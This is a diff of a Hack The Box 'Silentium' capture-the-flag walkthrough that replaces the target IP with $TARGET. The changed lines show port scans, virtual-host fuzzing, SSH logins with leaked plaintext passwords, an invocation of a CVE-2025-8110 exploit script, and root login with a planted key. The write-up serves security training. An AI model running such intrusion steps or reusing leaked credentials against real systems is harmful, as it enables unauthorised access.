@@ -1,6 +1,6 @@
 # HTB "Silentium" — Walkthrough & Penetration Testing Report
 
-**Target:** 10.129.109.201 (`silentium.htb`)
+**Target:** $TARGET (`silentium.htb`)
 **Difficulty:** Easy
 **OS:** Linux (Ubuntu 24.04.4 LTS, kernel 6.8.0-107-generic)
 **Status:** COMPLETE — user.txt and root.txt both captured
@@ -46,9 +46,9 @@ combine into a full compromise even when the host OS itself is hardened.
 ### 2.1 Host discovery & port scan
 
 ```bash
-nmap -sn -oN nmap/host_discovery.txt 10.129.109.201        # host is up
-nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt 10.129.109.201
-nmap -sC -sV -p22,80 -oN nmap/services.txt 10.129.109.201
+nmap -sn -oN nmap/host_discovery.txt $TARGET        # host is up
+nmap -p- --min-rate=1000 -T4 -oN nmap/allports.txt $TARGET
+nmap -sC -sV -p22,80 -oN nmap/services.txt $TARGET
 ```
 
 The full 65535-port TCP sweep returns exactly two open ports — a minimal
@@ -67,7 +67,7 @@ the real content lives behind a `Host:` header nginx is waiting to match.
 ### 2.2 Main site reconnaissance
 
 ```bash
-echo "10.129.109.201 silentium.htb" | sudo tee -a /etc/hosts
+echo "$TARGET silentium.htb" | sudo tee -a /etc/hosts
 whatweb http://silentium.htb/
 curl -s http://silentium.htb/ -o web/index.html
 ```
@@ -90,7 +90,7 @@ rest of the engagement (`ben`, `ben@silentium.htb`).
 ### 2.3 Virtual-host discovery
 
 ```bash
-ffuf -u http://10.129.109.201/ -H "Host: FUZZ.silentium.htb" \
+ffuf -u http://$TARGET/ -H "Host: FUZZ.silentium.htb" \
      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
      -fs 178 -t 50 -o fuzz/vhost_ffuf.json -of json
 ```
@@ -106,7 +106,7 @@ staging.silentium.htb  ->  200 OK, 3142 bytes, distinct content
 ```
 
 ```bash
-echo "10.129.109.201 staging.silentium.htb" | sudo tee -a /etc/hosts
+echo "$TARGET staging.silentium.htb" | sudo tee -a /etc/hosts
 curl -s http://staging.silentium.htb/ -o web/staging.html
 ```
 
@@ -341,15 +341,15 @@ Both leaked credential pairs were tried against host SSH for the candidate
 username `ben`:
 
 ```bash
-ssh ben@10.129.109.201     # try FLOWISE_PASSWORD: F1l3_d0ck3r
+ssh ben@$TARGET     # try FLOWISE_PASSWORD: F1l3_d0ck3r
 # Permission denied — dead end, logged to Failed Attempts
 
-ssh ben@10.129.109.201     # try SMTP_PASSWORD: r04D!!_R4ge
+ssh ben@$TARGET     # try SMTP_PASSWORD: r04D!!_R4ge
 # Accepted!
 ```
 
 ```bash
-sshpass -p 'r04D!!_R4ge' ssh ben@10.129.109.201 'id; hostname; uname -a'
+sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET 'id; hostname; uname -a'
 ```
 
 ```
@@ -367,7 +367,7 @@ assume, since leaked secrets of superficially similar shape (both look like
 "app password env vars") can have completely different blast radii.
 
 ```bash
-sshpass -p 'r04D!!_R4ge' ssh ben@10.129.109.201 'cat ~/user.txt'
+sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET 'cat ~/user.txt'
 ```
 
 ```
@@ -484,7 +484,7 @@ reachable directly over the box's already-open public port 80 — the vhost
 was never actually network-isolated, just unlisted:
 
 ```bash
-echo "10.129.109.201 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
+echo "$TARGET staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
 curl -s http://staging-v2-code.dev.silentium.htb/ | grep -io '<title>[^<]*</title>'
 # <title>Gogs</title>   — confirmed reachable from outside
 ```
@@ -585,7 +585,7 @@ python3 /tmp/CVE-2025-8110/CVE-2025-8110.py \
 landed in root's `authorized_keys`:
 
 ```bash
-ssh -i loot/silentium_root_key root@10.129.109.201 'id; hostname; cat /root/root.txt'
+ssh -i loot/silentium_root_key root@$TARGET 'id; hostname; cat /root/root.txt'
 ```
 
 ```
